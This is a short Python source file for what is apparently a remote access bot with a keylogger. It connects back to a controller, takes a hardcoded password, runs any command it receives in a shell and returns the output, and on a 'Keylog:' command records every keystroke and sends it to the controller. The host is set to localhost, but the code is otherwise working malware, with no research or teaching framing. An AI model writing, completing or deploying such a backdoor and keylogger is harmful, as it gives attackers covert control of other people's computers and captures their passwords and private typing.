import socket
import subprocess
import pynput
import time
from pynput.keyboard import Key, Listener
host = "127.0.0.1"
port = 1222
password = "Moffitt123"
ended = False
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def login():
    global s
    global s2
    s.send("Login: ".encode("utf-8"))
    pwd = s2.recv(1024)
    pwd2 = ''
    pwd2 += pwd.decode("utf-8")

    if pwd2.strip() != password:
        login()

    else:
        s.send("Connnected to bot".encode("utf-8"))
        shell()


def shell():
    def on_press(key):
        key = str(key)
        s.send(key.encode("utf-8"))
    while True:
        fulldata = ''
        data = s2.recv(1024)
        fulldata += data.decode("utf-8")
        if fulldata.strip() == "Stop:":
            break
        if fulldata.strip() == "Keylog:":
            s.send("Keylogging".encode("utf-8"))
            while True:
                with Listener(on_press=on_press) as l:
                    l.join()


        proc = subprocess.Popen(fulldata, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
def start():
    while True:
        try:    
            s.connect((host, port))
        except:
            pass
        else:
            while True:
                try:
                    s2.connect((host, 1223))
                except:
                    pass
                else:
                    login()

start()
